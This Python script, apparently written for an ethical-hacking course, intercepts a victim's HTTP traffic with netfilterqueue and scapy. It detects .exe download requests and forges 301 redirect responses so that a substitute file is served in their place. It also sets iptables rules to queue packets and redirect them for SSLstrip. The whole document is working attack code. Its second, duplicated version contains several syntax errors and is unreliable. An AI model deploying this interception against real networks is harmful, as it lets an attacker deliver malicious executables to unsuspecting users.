#!/usr/bin/env python

#doesn't actually work in python3 currently, errors about str being returned instead of bytes-like object

import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list = [] #initiliaze outside of function, otherwise it will reinitialize for every packet

def set_iptables(): #automate setting IPtables for testing on localhost
    print("\n[+] Setting up IPTables\n")
    #subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
    #to use with SSLstrip
    
def restore_iptables():
    print("\n[+] Flushing IPTables\n")
    subprocess.call(["iptables", "--flush"])
    
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            print("\nHTTP Request outbound found:\n")
            #print(scapy_packet.show())
            if ".exe" in scapy_packet[scapy.Raw].load and "https://rarlab.com/rar" not in scapy_packet[scapy.Raw].load:
                #fix possible loop issue where .exe of replacement file is detected by program
                print("\n****EXE FOUND****\n")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000: #if this exists, packet is HTTP response inbound
            if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("++Replacing file")
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab.com/rar/wrar571.exe\n\n")
                    
                    packet.set_payload(str(modified_packet))
                    
    packet.accept() #forward packets to target, connectivity seems normal

try:
    while True:
        set_iptables()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\n[+] Stopping file download interceptor")
    restore_iptables()
    
    
#messy commented code below
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables --flush - delete rules set up
#INPUT and OUTPUT chains to test on your own computer
#FORWARD chain to use on other computers

import netfilterqueue
#need to have module installed - pip install netfilterqueue / pip3 install
#apt-get install build-essential python-dev libnetfilter-queue-dev if errors
import scapy.all as scapy
import subprocess

ack_list = [] #initiliaze outside of function, otherwise it will reinitialize for every packet

def set_iptables(): #automate setting up iptables chains for testing on own computer
    print("\n[+] Setting up IPTables\n")
    #python3 code:
    #subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    #subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    #python2 code:
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    
def restore_iptables():
    print("\n[+] Flushing IPTables\n")
    #subprocess.run(["iptables", "--flush"])
    subprocess.call(["iptables", "--flush"])
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #store packet as a variable;
    #wrapped in scapy layer that lets you access layers of packet using scapy;
    #then able to modify
    if scapy_packet.haslayer(scapy.Raw): #http request is in the Raw layer in scapy
        if scapy_packet[scapy.TCP].dport == 80: #if this exists, packet is HTTP request outbound
            print("\nHTTP Request outbound found:\n")
            print(scapy_packet.show())
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("EXE found")
                ack_list.append(scapy_packet[scapy.TCP].ack #append TCP ACK field to list
                print(scapy_packet.show()) #show whats in the packet to determine what you want to modify
        elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
            if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                print("++Replacing file")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq) #remove from list since it's no
                    #longer needed once it's printed
                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://testhtml5.vulnweb.com/static/img/logo2.png"
                    #modify load response to fake that resource has been moved to another location
                    #the load field in scapy is a string so this will work without modification
                    del scapy_packet(scapy.IP].len
                    del scapy_packet(scapy.IP].chksum
                    del scapy_packet(scapy.TCP].chksum
                    #remove checksum fields so packets won't be corrupted
                    #scapy auotmatically regenerates them
                    #print("\nHTTP Response inbound found:\n")
                    #print(scapy_packet.show())
                    
                    packet.set_payload(str(scapy_packet)) #scapy method - convert packet to a string and set
                    #it as a payload to be sent
            
        #print(scapy_packet.show()) #print out any packet with a RAW layer;
        #this will show packets that have HTTP requests, so it can be narrowed
        #down to what fields are being looked for to find file download requests
        #only works for http

    packet.accept() #forward packets to target, connectivity seems normal

try:
    while True:
        set_iptables()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet) #invoke bind method of NetfilterQueue
        #0 - queue number used in iptables
        #process packet is a callback function that will be run on each packet
        queue.run
except KeyboardInterrupt:
    print("\n[+] Stopping DNS Spoof")
    restore_iptables()
#all packets received will be put in the queue that was set up
#on target computer, connectivity will be interrupted as each packet is being held

